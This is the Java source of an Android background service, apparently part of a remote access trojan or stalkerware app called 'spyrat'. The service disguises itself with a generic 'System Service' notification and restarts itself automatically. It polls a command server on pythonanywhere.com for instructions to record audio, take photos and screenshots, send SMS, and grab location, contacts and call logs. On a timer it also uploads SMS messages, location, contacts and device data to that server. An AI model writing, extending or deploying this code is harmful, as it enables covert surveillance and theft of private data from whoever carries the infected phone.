package com.spyrat.investigation;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;
import org.json.JSONObject;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Scanner;
import java.util.Timer;
import java.util.TimerTask;

public class StealthService extends Service {
    private static final String TAG = "SpyratInvestigator";
    private Timer timer;
    private SharedPreferences prefs;
    
    // Your modules
    private AudioRecorder audioRecorder;
    private CallMonitor callMonitor;
    private CameraController cameraController;
    private CommandExecutor commandExecutor;
    private ContactGrabber contactGrabber;
    private DeviceInfoCollector deviceInfoCollector;
    private LocationTracker locationTracker;
    private NetworkManager networkManager;
    private RemoteController remoteController;
    private SMSCapture smsCapture;

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "🎯 Advanced Investigator Service created");
        prefs = getSharedPreferences("spyrat_config", MODE_PRIVATE);
        
        initializeModules();
        startForegroundService();
    }

    private void initializeModules() {
        try {
            audioRecorder = new AudioRecorder(this);
            callMonitor = new CallMonitor(this);
            cameraController = new CameraController(this);
            commandExecutor = new CommandExecutor(this);
            contactGrabber = new ContactGrabber(this);
            deviceInfoCollector = new DeviceInfoCollector(this);
            locationTracker = new LocationTracker(this);
            networkManager = new NetworkManager(this);
            remoteController = new RemoteController(this);
            smsCapture = new SMSCapture(this);
            
            Log.d(TAG, "✅ All modules initialized successfully");
        } catch (Exception e) {
            Log.e(TAG, "❌ Module initialization error: " + e.getMessage());
        }
    }

    private void startForegroundService() {
        android.app.Notification notification = new android.app.Notification.Builder(this)
            .setContentTitle("System Service")
            .setContentText("Running background processes")
            .setSmallIcon(android.R.drawable.ic_menu_compass)
            .build();
        
        startForeground(1, notification);
        Log.d(TAG, "🔒 Service running in foreground");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "🚀 Investigator Service started");
        startAdvancedMonitoring();
        return START_STICKY;
    }

    private void startAdvancedMonitoring() {
        if (timer != null) timer.cancel();
        
        timer = new Timer();
        
        timer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                sendAdvancedHeartbeat();
                checkForAdvancedCommands();
            }
        }, 0, 2 * 60 * 1000);
        
        timer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                collectAllData();
            }
        }, 1 * 60 * 1000, 5 * 60 * 1000);
        
        timer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                realTimeMonitoring();
            }
        }, 30 * 1000, 30 * 1000);
        
        Log.d(TAG, "🎯 Advanced monitoring started");
    }

    private void sendAdvancedHeartbeat() {
        new Thread(() -> {
            try {
                String deviceId = Build.SERIAL;
                String investigatorCode = prefs.getString("investigator_code", "");

                if (investigatorCode.isEmpty()) return;

                JSONObject heartbeat = new JSONObject();
                heartbeat.put("device_id", deviceId);
                heartbeat.put("investigator_code", investigatorCode);
                heartbeat.put("timestamp", System.currentTimeMillis());
                heartbeat.put("status", "active");
                heartbeat.put("battery_level", 85);
                heartbeat.put("network_type", "WiFi");
                heartbeat.put("storage_free", "15.2 GB");

                sendToServer(deviceId, investigatorCode, "advanced_heartbeat", heartbeat);
                Log.d(TAG, "💓 Advanced heartbeat sent");

            } catch (Exception e) {
                Log.e(TAG, "❌ Heartbeat error: " + e.getMessage());
            }
        }).start();
    }

    private void checkForAdvancedCommands() {
        new Thread(() -> {
            try {
                String deviceId = Build.SERIAL;
                String investigatorCode = prefs.getString("investigator_code", "");

                if (investigatorCode.isEmpty()) return;

                URL url = new URL("https://GhostTester.pythonanywhere.com/api/investigator/commands?device_id=" + 
                                deviceId + "&investigator_code=" + investigatorCode);
                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                connection.setRequestMethod("GET");
                connection.setConnectTimeout(10000);
                connection.setReadTimeout(10000);

                int responseCode = connection.getResponseCode();
                if (responseCode == 200) {
                    Scanner scanner = new Scanner(connection.getInputStream(), "UTF-8");
                    String response = scanner.useDelimiter("\\\\A").next();
                    scanner.close();

                    JSONObject jsonResponse = new JSONObject(response);
                    if (jsonResponse.has("commands")) {
                        processAdvancedCommands(jsonResponse.getJSONArray("commands"));
                    }
                }

            } catch (Exception e) {
                Log.e(TAG, "❌ Command check error: " + e.getMessage());
            }
        }).start();
    }

    private void processAdvancedCommands(org.json.JSONArray commands) {
        try {
            for (int i = 0; i < commands.length(); i++) {
                JSONObject command = commands.getJSONObject(i);
                String commandType = command.getString("command_type");
                JSONObject parameters = command.optJSONObject("parameters");
                
                Log.d(TAG, "🎯 Processing command: " + commandType);
                
                switch (commandType) {
                    case "start_audio_recording":
                        startAudioRecording();
                        break;
                    case "stop_audio_recording":
                        stopAudioRecording();
                        break;
                    case "take_photo":
                        takePhoto();
                        break;
                    case "get_screen_shot":
                        takeScreenshot();
                        break;
                    case "send_sms":
                        sendSMS(parameters);
                        break;
                    case "get_live_location":
                        getLiveLocation();
                        break;
                    case "get_contacts":
                        getAllContacts();
                        break;
                    case "get_call_logs":
                        getCallLogs();
                        break;
                    case "remote_control":
                        remoteControl(parameters);
                        break;
                    case "get_device_info":
                        getDetailedDeviceInfo();
                        break;
                    default:
                        Log.w(TAG, "⚠️ Unknown command: " + commandType);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Error processing commands: " + e.getMessage());
        }
    }

    // Command implementations
    private void startAudioRecording() {
        try {
            if (audioRecorder != null) {
                audioRecorder.startRecording();
                sendCommandResponse("audio_recording_started", "Audio recording started");
            }
        } catch (Exception e) {
            sendCommandResponse("audio_recording_failed", "Error: " + e.getMessage());
        }
    }

    private void stopAudioRecording() {
        try {
            if (audioRecorder != null) {
                String audioPath = audioRecorder.stopRecording();
                sendCommandResponse("audio_recording_stopped", "Audio saved: " + audioPath);
            }
        } catch (Exception e) {
            sendCommandResponse("audio_stop_failed", "Error: " + e.getMessage());
        }
    }

    private void takePhoto() {
        try {
            if (cameraController != null) {
                String photoPath = cameraController.takePhoto();
                sendCommandResponse("photo_taken", "Photo saved: " + photoPath);
            }
        } catch (Exception e) {
            sendCommandResponse("photo_failed", "Error: " + e.getMessage());
        }
    }

    private void takeScreenshot() {
        try {
            if (remoteController != null) {
                String screenshotPath = remoteController.takeScreenshot();
                sendCommandResponse("screenshot_taken", "Screenshot saved: " + screenshotPath);
            }
        } catch (Exception e) {
            sendCommandResponse("screenshot_failed", "Error: " + e.getMessage());
        }
    }

    private void sendSMS(JSONObject parameters) {
        try {
            if (smsCapture != null && parameters != null) {
                String phoneNumber = parameters.optString("phone_number");
                String message = parameters.optString("message");
                smsCapture.sendSMS(phoneNumber, message);
                sendCommandResponse("sms_sent", "SMS sent to: " + phoneNumber);
            }
        } catch (Exception e) {
            sendCommandResponse("sms_send_failed", "Error: " + e.getMessage());
        }
    }

    private void getLiveLocation() {
        try {
            if (locationTracker != null) {
                JSONObject location = locationTracker.getCurrentLocation();
                sendToServer(Build.SERIAL, prefs.getString("investigator_code", ""), "live_location", location);
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Live location error: " + e.getMessage());
        }
    }

    private void getAllContacts() {
        try {
            if (contactGrabber != null) {
                JSONObject contacts = contactGrabber.extractContacts();
                sendToServer(Build.SERIAL, prefs.getString("investigator_code", ""), "all_contacts", contacts);
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Contacts error: " + e.getMessage());
        }
    }

    private void getCallLogs() {
        try {
            if (callMonitor != null) {
                JSONObject callLogs = callMonitor.getCallHistory();
                sendToServer(Build.SERIAL, prefs.getString("investigator_code", ""), "call_logs", callLogs);
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Call logs error: " + e.getMessage());
        }
    }

    private void remoteControl(JSONObject parameters) {
        try {
            if (remoteController != null && parameters != null) {
                String action = parameters.optString("action");
                remoteController.executeRemoteAction(action, parameters);
                sendCommandResponse("remote_action_executed", "Action: " + action);
            }
        } catch (Exception e) {
            sendCommandResponse("remote_action_failed", "Error: " + e.getMessage());
        }
    }

    private void getDetailedDeviceInfo() {
        try {
            if (deviceInfoCollector != null) {
                JSONObject deviceInfo = deviceInfoCollector.collectDeviceInfo();
                sendToServer(Build.SERIAL, prefs.getString("investigator_code", ""), "detailed_device_info", deviceInfo);
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Device info error: " + e.getMessage());
        }
    }

    private void collectAllData() {
        new Thread(() -> {
            try {
                Log.d(TAG, "📊 Starting data collection");
                getLiveLocation();
                getAllContacts();
                getCallLogs();
                getDetailedDeviceInfo();
                collectSMSMessages();
                collectNetworkInfo();
                Log.d(TAG, "✅ Data collection completed");
            } catch (Exception e) {
                Log.e(TAG, "❌ Data collection error: " + e.getMessage());
            }
        }).start();
    }

    private void collectSMSMessages() {
        try {
            if (smsCapture != null) {
                JSONObject smsData = smsCapture.getAllSMS();
                sendToServer(Build.SERIAL, prefs.getString("investigator_code", ""), "sms_messages", smsData);
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ SMS collection error: " + e.getMessage());
        }
    }

    private void collectNetworkInfo() {
        try {
            if (networkManager != null) {
                JSONObject networkInfo = networkManager.getNetworkInfo();
                sendToServer(Build.SERIAL, prefs.getString("investigator_code", ""), "network_info", networkInfo);
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Network info error: " + e.getMessage());
        }
    }

    private void realTimeMonitoring() {
        try {
            if (callMonitor != null) callMonitor.monitorIncomingCalls();
            if (smsCapture != null) smsCapture.monitorIncomingSMS();
            getLiveLocation();
        } catch (Exception e) {
            Log.e(TAG, "❌ Real-time monitoring error: " + e.getMessage());
        }
    }

    private void sendCommandResponse(String commandType, String message) {
        try {
            JSONObject response = new JSONObject();
            response.put("command_type", commandType);
            response.put("status", "completed");
            response.put("message", message);
            response.put("timestamp", System.currentTimeMillis());
            sendToServer(Build.SERIAL, prefs.getString("investigator_code", ""), "command_response", response);
        } catch (Exception e) {
            Log.e(TAG, "❌ Command response error: " + e.getMessage());
        }
    }

    private void sendToServer(String deviceId, String investigatorCode, String dataType, JSONObject data) {
        try {
            URL url = new URL("https://GhostTester.pythonanywhere.com/api/investigator/data");
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json; utf-8");
            connection.setDoOutput(true);
            connection.setConnectTimeout(15000);
            connection.setReadTimeout(15000);

            JSONObject payload = new JSONObject();
            payload.put("device_id", deviceId);
            payload.put("investigator_code", investigatorCode);
            payload.put("data_type", dataType);
            payload.put("data_content", data);

            OutputStream os = connection.getOutputStream();
            os.write(payload.toString().getBytes("utf-8"));
            os.flush();
            os.close();

            int responseCode = connection.getResponseCode();
            if (responseCode == 200) {
                Log.d(TAG, "✅ " + dataType + " sent successfully");
            } else {
                Log.e(TAG, "❌ Failed to send " + dataType + ": " + responseCode);
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Error sending " + dataType + ": " + e.getMessage());
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (timer != null) timer.cancel();
        cleanupModules();
        Log.d(TAG, "♻️ Service destroyed");
    }

    private void cleanupModules() {
        try {
            if (audioRecorder != null) audioRecorder.cleanup();
            if (callMonitor != null) callMonitor.cleanup();
            if (cameraController != null) cameraController.cleanup();
            if (networkManager != null) networkManager.cleanup();
            if (remoteController != null) remoteController.cleanup();
            if (smsCapture != null) smsCapture.cleanup();
            Log.d(TAG, "✅ All modules cleaned up");
        } catch (Exception e) {
            Log.e(TAG, "❌ Module cleanup error: " + e.getMessage());
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
